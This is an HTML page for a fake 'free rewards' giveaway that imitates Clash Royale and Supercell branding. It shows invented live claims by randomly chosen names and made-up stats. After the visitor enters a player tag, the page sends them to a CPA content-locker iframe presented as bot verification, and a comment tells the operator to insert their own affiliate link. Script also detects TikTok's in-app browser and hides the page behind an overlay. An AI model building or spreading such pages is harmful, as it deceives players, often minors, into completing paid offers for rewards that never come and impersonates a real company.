<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale Rewards - May 2026 Meta</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --cr-bright-blue: #00a2ff;
            --cr-deep-blue: #0054a6;
            --cr-gold-grad: linear-gradient(180deg, #ffde00 0%, #ff9900 100%);
            --cr-green-grad: linear-gradient(180deg, #7cfc00 0%, #4ea100 100%);
            --card-shadow: 0 10px 0px rgba(0, 58, 115, 1);
        }

        body {
            margin: 0; padding: 0;
            background-color: var(--cr-bright-blue);
            font-family: 'Lilita One', cursive;
            color: white; text-align: center;
            background-image: radial-gradient(circle, rgba(255,255,255,0.2) 2px, transparent 2px);
            background-size: 30px 30px;
        }

        /* TikTok Protection */
        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 999999; }
        #tutorialGif { width: 100%; height: 100%; object-fit: contain; }

        /* Header */
        .header {
            background: rgba(0, 84, 166, 0.9);
            padding: 15px 0; border-bottom: 5px solid #ffde00;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .live-feed { font-size: 13px; color: #fff; margin-top: 5px; }
        .live-feed span { color: #ffde00; }

        .logo-container { margin: 25px 0; }
        .logo { width: 200px; filter: drop-shadow(0 5px 0px rgba(0,0,0,0.2)); }

        /* Stats Panel */
        .stats-container {
            background: #fff; border: 4px solid var(--cr-deep-blue);
            border-radius: 20px; display: inline-flex; gap: 40px;
            padding: 15px 35px; margin-bottom: 30px; box-shadow: 0 6px 0px #003a73;
        }
        .stat-item { display: flex; flex-direction: column; color: var(--cr-deep-blue); }
        .stat-num { font-size: 24px; color: #ff8000; }

        /* Grid */
        .container { width: 95%; max-width: 600px; margin: 0 auto; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; padding-bottom: 50px; }

        .card {
            background: #fff; border: 4px solid var(--cr-deep-blue);
            border-radius: 20px; padding: 15px 10px;
            position: relative; box-shadow: var(--card-shadow);
            transition: 0.1s;
        }
        .card:active { transform: translateY(5px); box-shadow: 0 5px 0px #003a73; }

        .tag-evo {
            position: absolute; top: -10px; right: -10px;
            background: #7a28ff; color: #fff; font-size: 10px;
            padding: 5px 10px; border-radius: 10px; border: 2px solid #fff;
            transform: rotate(15deg); box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
        }

        .item-name { color: var(--cr-deep-blue); font-size: 15px; margin-bottom: 10px; height: 35px; display: flex; align-items: center; justify-content: center; }
        .img-container { height: 110px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; }
        .item-img { max-width: 95%; max-height: 100%; filter: drop-shadow(0 5px 5px rgba(0,0,0,0.1)); }

        .btn-claim {
            background: var(--cr-green-grad); border: none;
            border-bottom: 5px solid #2d5d00; border-radius: 12px;
            color: #fff; font-size: 20px; width: 100%; padding: 10px 0;
            cursor: pointer; font-family: 'Lilita One', cursive; text-shadow: 2px 2px 0px #000;
        }

        /* Modals */
        .modal {
            position: fixed; inset: 0; background: rgba(0,0,0,0.85);
            display: none; justify-content: center; align-items: center; z-index: 10000;
            backdrop-filter: blur(5px);
        }
        .modal-content {
            background: #fff; width: 85%; max-width: 400px;
            border: 6px solid var(--cr-deep-blue); border-radius: 30px;
            padding: 30px; color: var(--cr-deep-blue);
        }
        .input-box {
            background: #f0f8ff; border: 3px solid var(--cr-deep-blue);
            border-radius: 15px; padding: 15px; margin: 20px 0;
        }
        .input-box input {
            background: transparent; border: none; width: 100%;
            font-family: 'Lilita One', cursive; font-size: 22px; text-align: center; outline: none;
        }
        .btn-final {
            background: var(--cr-gold-grad); border: none;
            border-bottom: 6px solid #b35900; border-radius: 15px;
            color: #fff; font-size: 28px; width: 100%; padding: 12px 0;
            text-shadow: 2px 2px 0px #000; cursor: pointer; font-family: 'Lilita One', cursive;
        }

        footer { background: #003a73; padding: 30px; margin-top: 40px; font-size: 11px; }
    </style>
</head>
<body onclick="document.getElementById('ttOverlay').style.display='none'">

    <div id="ttOverlay">
        <img src="tutorial.gif" id="tutorialGif">
    </div>

    <div class="header">
        <img src="https://link.clashroyale.com/images/cr-logo-white.png" width="160">
        <div class="live-feed" id="feed">👑 <b>Yassine</b> just claimed <span>Mighty Miner!</span></div>
    </div>

    <div class="logo-container">
        <div class="stats-container">
            <div class="stat-item"><span style="font-size:10px">REWARDS LEFT</span><span class="stat-num" id="left">142</span></div>
            <div class="stat-item"><span style="font-size:10px">ACTIVE USERS</span><span class="stat-num">2,840</span></div>
        </div>
    </div>

    <div class="container">
        <div class="grid" id="grid"></div>
    </div>

    <!-- Modal 1 -->
    <div class="modal" id="m1">
        <div class="modal-content">
            <h2 style="margin:0">PLAYER TAG</h2>
            <p style="font-size:14px">Link your account to receive the reward</p>
            <div class="input-box">
                <input type="text" id="tag" placeholder="#P8LVQ..." maxlength="12">
            </div>
            <button class="btn-final" onclick="goLocker()">CONFIRM</button>
        </div>
    </div>

    <!-- Modal 2 -->
    <div class="modal" id="m2">
        <div class="modal-content">
            <h2 style="margin:0">VERIFICATION</h2>
            <p style="font-size:13px">To avoid bot abuse, please complete one task to release your reward.</p>
            <div style="height:400px; background:#eee; border-radius:15px; overflow:hidden; border:2px solid #ddd;">
                <!-- BEDDEL L-LINK DYAL CPA DYALK HNA -->
                <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
            </div>
        </div>
    </div>

    <footer>
        <img src="https://supercell.com/images/800/logo_supercell@2x.png" width="70"><br><br>
        &copy; 2026 Supercell Oy. All rights reserved.
    </footer>

    <script>
        const rewards = [
            {n: "MIGHTY MINER", img: "mminer.png", evo: false},
            {n: "BOSS BANDIT", img: "bandit.png", evo: false},
            {n: "EVO KNIGHT", img: "knight.png", evo: true},
            {n: "EVO GOBLINS", img: "goblins.png", evo: true},
            {n: "MAGIC ARCHER", img: "marcher.png", evo: false},
            {n: "MINI P.E.K.K.A", img: "minipekka.png", evo: false},
            {n: "GIANT SKELETON", img: "gskeleton.png", evo: false},
            {n: "BALLOON", img: "balloon.png", evo: false},
            {n: "MEGA MINION", img: "megaminion.png", evo: false},
            {n: "BARBARIAN BARREL", img: "bbarrel.png", evo: false},
            {n: "DARK PRINCE", img: "dprince.png", evo: false},
            {n: "10,000 GEMS", img: "gems.png", evo: false}
        ];

        const grid = document.getElementById('grid');
        rewards.forEach(r => {
            grid.innerHTML += `
                <div class="card">
                    ${r.evo ? '<div class="tag-evo">EVOLUTION</div>' : ''}
                    <div class="item-name">${r.n}</div>
                    <div class="img-container"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/100?text=CR'"></div>
                    <button class="btn-claim" onclick="openM()">CLAIM</button>
                </div>
            `;
        });

        function openM() { document.getElementById('m1').style.display='flex'; }
        function goLocker() {
            if(document.getElementById('tag').value.length > 2) {
                document.getElementById('m1').style.display='none';
                document.getElementById('m2').style.display='flex';
            }
        }

        // Live Feed
        const names = ["Omar", "Sami", "Hamza", "Sara", "Zineb", "Anas"];
        setInterval(() => {
            const f = document.getElementById('feed');
            f.style.opacity = 0;
            setTimeout(() => {
                const n = names[Math.floor(Math.random()*names.length)];
                const i = rewards[Math.floor(Math.random()*rewards.length)].n;
                f.innerHTML = `👑 <b>${n}</b> just claimed <span>${i}!</span>`;
                f.style.opacity = 1;
            }, 500);
        }, 3000);

        // TikTok detection
        if (/TikTok|Bytedance/i.test(navigator.userAgent)) {
            document.getElementById("ttOverlay").style.display = "block";
        }
    </script>
</body>
</html>
